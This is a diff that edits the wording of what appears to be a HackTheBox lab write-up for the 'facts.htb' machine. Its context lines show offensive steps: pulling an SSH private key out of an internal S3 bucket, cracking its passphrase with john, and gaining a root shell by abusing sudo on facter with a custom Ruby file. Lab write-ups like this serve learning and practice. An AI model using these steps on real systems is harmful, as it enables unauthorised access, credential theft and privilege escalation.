@@ -126,7 +126,7 @@ Directory fuzzing surfaced an admin panel:
 302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
 ```
 
-Registration was open at `http://facts.htb/admin/register` — after creating an account, the panel revealed **Camaleon CMS v2.9.0**.
+Registration was open at `http://facts.htb/admin/register`, and once an account was created the panel revealed **Camaleon CMS v2.9.0**.
 
 # User
 
@@ -177,7 +177,7 @@ aws --endpoint-url http://facts.htb:54321/ s3 cp s3://internal/.ssh/id_ed25519 .
 
 ## Passphrase Cracking
 
-The private key was protected with a passphrase. Cracked with `john`:
+The private key was passphrase-protected, so I cracked it with `john`:
 
 ```bash
 ssh2john id_ed25519 > pvt.john
@@ -191,7 +191,7 @@ john pvt.john --wordlist=/usr/share/wordlists/rockyou.txt
 Passphrase : dragonballz
 ```
 
-Regenerated the public key to confirm the username, then authenticated:
+Regenerating the public key confirmed the username, so all that was left was to authenticate:
 
 ```bash
 ssh-keygen -y -P "dragonballz" -f id_ed25519
@@ -214,7 +214,7 @@ User trivia may run the following commands on facts:
 (ALL) NOPASSWD: /usr/bin/facter
 ```
 
-**facter** reports system facts but honors `--custom-dir` even when `FACTERLIB` is blocked by `env_reset` — loading arbitrary Ruby code:
+**facter** reports system facts, but it honors `--custom-dir` even when `FACTERLIB` is blocked by `env_reset` — loading arbitrary Ruby code:
 
 ```bash
 echo 'exec("/bin/bash")' > exploit.rb
